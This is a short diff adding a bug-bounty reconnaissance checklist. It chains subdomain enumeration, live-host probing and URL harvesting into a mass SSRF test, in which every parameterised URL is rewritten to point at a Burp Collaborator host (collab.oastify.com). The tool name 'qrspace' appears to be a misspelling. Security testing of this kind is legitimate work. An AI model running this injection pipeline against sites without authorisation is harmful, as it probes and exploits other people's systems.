@@ -1,0 +1,29 @@
+SUBDOMAIN ENUM
+
+  a) subfinder
+  b) asset finder
+  c) amass
+
+MERGE & DUPLICATES
+
+  cat *.txt | sort -u > final.txt
+
+LIVE SUBDOMAINS
+
+  cat final.txt | httpx > live.txt
+
+COLLECTING URLS
+
+ a)katana -u live.txt -d 2 -o katana.txt
+ b)cat live.txt | gau | sort -u > gau.txt
+ c)urlfinder -d example.com | sort -u > urls.txt
+ d)cat live.txt | waybackurls > way.txt
+
+MERGE & DUPLICATES OF URLS
+ cat katana.txt gau.txt urls.txt way.txt | sort -u > allurls.txt
+
+INJECTION BURP COLLAB URL 
+ cat allurls.txt | grep "=" | qrspace http://collab.oastify.com > ssrf.txt
+
+FOLLOWING REDIRECT
+ cat ssrf.txt | httpx -fr              (So in here we are following all the url that redirecting )
